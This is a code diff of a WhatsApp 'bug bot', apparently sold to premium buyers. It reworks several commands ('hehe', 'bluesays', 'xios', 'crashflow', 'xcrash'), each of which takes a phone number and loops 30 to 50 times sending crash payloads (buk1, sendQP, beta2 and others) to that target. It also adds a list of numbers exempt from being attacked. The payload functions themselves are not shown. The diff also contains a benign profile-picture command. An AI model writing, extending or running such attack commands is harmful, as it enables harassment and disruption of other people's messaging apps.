                 return reply('*ANTIBUG DEACTIVATED*')
             }
             break
-           case 'hehe':
-                if (!isPremium) return reply(mess.only.premium)
-                if (!isBuyer) return reply(mess.only.buyer)
-                if (!q) return reply(`Example: ${prefix + command} 62×××`)
-                target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                reply(bugres)
-                for (let i = 0; i < 50; i++) {
-                    await buk1(blue, target, "p", 1020000, ptcp = true);
-                    sendQP(target, wanted)
-                    await sendQP(target, wanted)
-                    await beta2(blue, target, wanted)
-                    await sendSessionStructure(target, wanted)
-                    await beta1(blue, target, wanted)
-                }
-                reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`)
-                break
+case 'hehe':
+    if (!isPremium) return reply(mess.only.premium);
+    if (!isBuyer) return reply(mess.only.buyer);
+    if (!q) return reply(`Example: ${prefix + command} 62×××`);
+    
+    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+    if (restrictedTargets.includes(target.replace("@s.whatsapp.net", ""))) {
+        return reply('This number is restricted from being attacked.');
+    }
+    
+    reply(bugres);
 
-            case 'bluesays':
-                if (!isPremium) return reply(mess.only.premium)
-                if (!isBuyer) return reply(mess.only.buyer)
-                if (!q) return reply(`Example: ${prefix + command} 62×××`)
-                target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                reply(bugres)
-                for (let i = 0; i < 50; i++) {
-                    await buk1(blue, target, "p", 1020000, ptcp = true);
-                    sendQP(target, wanted)
-                    await sendQP(target, wanted)
-                    await beta2(blue, target, wanted)
-                    await sendSessionStructure(target, wanted)
-                    await beta1(blue, target, wanted)
-                }
-                reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`)
-                break
+    for (let i = 0; i < 50; i++) {
+        await buk1(blue, target, "p", 1020000, ptcp = true);
+        await sendQP(target, wanted);
+        await beta2(blue, target, wanted);
+        await sendSessionStructure(target, wanted);
+        await beta1(blue, target, wanted);
+    }
 
-            case 'bluedid':
-                if (!isPremium) return reply(mess.only.premium)
-                if (!isBuyer) return reply(mess.only.buyer)
-                if (!q) return reply(`Example: ${prefix + command} 62×××`)
-                target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                reply(bugres)
-                for (let i = 0; i < 30; i++) {
-                    await buk1(blue, target, "p", 1020000, ptcp = true);
-                    sendQP(target, wanted)
-                    await sendQP(target, wanted)
-                    await beta2(blue, target, wanted)
-                    await sendSessionStructure(target, wanted)
-                    await beta1(blue, target, wanted)
-                }
-                reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`)
-                break
+    reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`);
+    break;
 
-            case 'xios':
-            case 'xip':
-                if (!isPremium) return reply(mess.only.premium)
-                if (!isBuyer) return reply(mess.only.buyer)
-                if (!q) return reply(`Example: ${prefix + command} 62×××`)
-                target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                reply(bugres)
-                for (let i = 0; i < 40; i++) {
-                    await buk1(blue, target, "p", 1020000, ptcp = true);
-                    await sendQP(target, wanted)
-                    await beta2(blue, target, wanted)
-                    await sendSessionStructure(target, wanted)
-                    await beta1(blue, target, wanted)
-                }
-                reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`)
-                break
+case 'bluesays':
+    if (!isPremium) return reply(mess.only.premium);
+    if (!isBuyer) return reply(mess.only.buyer);
+    if (!q) return reply(`Example: ${prefix + command} 62×××`);
+    
+    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+    if (restrictedTargets.includes(target.replace("@s.whatsapp.net", ""))) {
+        return reply('This number is restricted from being attacked.');
+    }
+    
+    reply(bugres);
 
-            case 'overflow':
-            case 'vasion':
-            case 'crashflow':
+    for (let i = 0; i < 50; i++) {
+        await buk1(blue, target, "p", 1020000, ptcp = true);
+        await sendQP(target, wanted);
+        await beta2(blue, target, wanted);
+        await sendSessionStructure(target, wanted);
+        await beta1(blue, target, wanted);
+    }
+
+    reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`);
+    break;
+
+case 'nighty':
+case 'bluedid':
+    if (!isPremium) return reply(mess.only.premium);
+    if (!isBuyer) return reply(mess.only.buyer);
+    if (!q) return reply(`Example: ${prefix + command} 62×××`);
+    
+    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+    if (restrictedTargets.includes(target.replace("@s.whatsapp.net", ""))) {
+        return reply('This number is restricted from being attacked.');
+    }
+    
+    reply(bugres);
+
+    for (let i = 0; i < 30; i++) {
+        await buk1(blue, target, "p", 1020000, ptcp = true);
+        await sendQP(target, wanted);
+        await beta2(blue, target, wanted);
+        await sendSessionStructure(target, wanted);
+        await beta1(blue, target, wanted);
+    }
+
+    reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`);
+    break;
+
+case 'xios':
+case 'xip':
+    if (!isPremium) return reply(mess.only.premium);
+    if (!isBuyer) return reply(mess.only.buyer);
+    if (!q) return reply(`Example: ${prefix + command} 62×××`);
+    
+    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+    if (restrictedTargets.includes(target.replace("@s.whatsapp.net", ""))) {
+        return reply('This number is restricted from being attacked.');
+    }
+    
+    reply(bugres);
+
+    for (let i = 0; i < 40; i++) {
+        await buk1(blue, target, "p", 1020000, ptcp = true);
+        await sendQP(target, wanted);
+        await beta2(blue, target, wanted);
+        await sendSessionStructure(target, wanted);
+        await beta1(blue, target, wanted);
+    }
+
+    reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`);
+    break;
+
+case 'overflow':
+case 'vasion':
+case 'crashflow':
+    if (!isPremium) return reply(mess.only.premium);
+    if (!isBuyer) return reply(mess.only.buyer);
+    if (!q) return reply(`Example: ${prefix + command} 62×××`);
+    
+    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+    if (restrictedTargets.includes(target.replace("@s.whatsapp.net", ""))) {
+        return reply('This number is restricted from being attacked.');
+    }
+    
+    reply(bugres);
+
+    for (let i = 0; i < 40; i++) {
+        await buk1(blue, target, "p", 1020000, ptcp = true);
+        await sendQP(target, wanted);
+        await beta2(blue, target, wanted);
+        await sendSessionStructure(target, wanted);
+        await beta1(blue, target, wanted);
+    }
+
+    reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`);
+    break;
+            case 'xcrash': {
                 if (!isPremium) return reply(mess.only.premium)
                 if (!isBuyer) return reply(mess.only.buyer)
-                if (!q) return reply(`Example: ${prefix + command} 62×××`)
-                target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                reply(bugres)
-                for (let i = 0; i < 40; i++) {
-                    await buk1(blue, target, "p", 1020000, ptcp = true);
-                    sendQP(target, wanted)
-                    await sendQP(target, wanted)
-                    await beta2(blue, target, wanted)
-                    await sendSessionStructure(target, wanted)
-                    await beta1(blue, target, wanted)
-                }
-                reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`)
-                break
-                 case 'xcrash': {
-                if (!isPremium) return reply(mess.only.premium)
-                if (!isBuyer) return reply(mess.only.buyer)
+                if (restrictedTargets.includes(inputNumber)) {
+        return reply('This number is restricted from being attacked.');
+    }
                 if (!q) return reply(`Example: ${prefix + command} 62×××`)
                 target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                 let sections = [{
@@ -2851,38 +3025,43 @@ break
                 })
             }
             break
-case 'setppbot': case 'setpp': {
-if (!isOwner) return reply(mess.only.owner)
-if (!quoted) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
-if (!/image/.test(mime)) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
-if (/webp/.test(mime)) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
-var medis = await blue.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
-if (args[0] == `full`) {
-var { img } = await generateProfilePicture(medis)
-await blue.query({
-tag: 'iq',
-attrs: {
-to: botNumber,
-type:'set',
-xmlns: 'w:profile:picture'
-},
-content: [
-{
-tag: 'picture',
-attrs: { type: 'image' },
-content: img
-}
-]
-})
-fs.unlinkSync(medis)
-reply(mess.success)
-} else {
-var memeg = await blue.updateProfilePicture(botNumber, { url: medis })
-fs.unlinkSync(medis)
-reply(mess.success)
-}
-}
-break
+            case 'setppbot':
+            case 'setpp': {
+                if (!isOwner) return reply(mess.only.owner)
+                if (!quoted) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
+                if (!/image/.test(mime)) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
+                if (/webp/.test(mime)) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
+                var medis = await blue.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
+                if (args[0] == `full`) {
+                    var {
+                        img
+                    } = await generateProfilePicture(medis)
+                    await blue.query({
+                        tag: 'iq',
+                        attrs: {
+                            to: botNumber,
+                            type: 'set',
+                            xmlns: 'w:profile:picture'
+                        },
+                        content: [{
+                            tag: 'picture',
+                            attrs: {
+                                type: 'image'
+                            },
+                            content: img
+                        }]
+                    })
+                    fs.unlinkSync(medis)
+                    reply(mess.success)
+                } else {
+                    var memeg = await blue.updateProfilePicture(botNumber, {
+                        url: medis
+                    })
+                    fs.unlinkSync(medis)
+                    reply(mess.success)
+                }
+            }
+            break
             case 'hdvid':
             case 'hdvideo':
             case 'vidiohd':
@@ -2929,11 +3108,6 @@ break
             break
 
 
-
-
-            
-
-            
 
 
             default:
